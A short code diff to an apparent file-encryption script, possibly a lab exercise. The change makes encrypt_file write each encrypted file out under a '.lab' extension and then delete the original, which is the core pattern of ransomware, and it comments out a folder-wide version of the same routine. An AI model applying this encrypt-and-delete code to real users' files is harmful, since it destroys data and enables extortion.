@@ -57,9 +57,17 @@ def encrypt_file(filepath):
         ),
     )
 
-    return encrypted_aes_key, nonce, ciphertext
+    output_file = os.path.join(filepath + ".lab")
+    with open(output_file, "wb") as f:
+        f.write(len(encrypted_aes_key).to_bytes(4, "big"))
+        f.write(encrypted_aes_key)
+        f.write(nonce)
+        f.write(ciphertext)
+
+    os.remove(filepath)
 
 
+"""
 def encrypt_folder(folder_path):
 
     #os.makedirs(folder_path, exist_ok=True)
@@ -77,3 +85,4 @@ def encrypt_folder(folder_path):
                 f.write(ciphertext)
 
             os.remove(filepath)
+"""
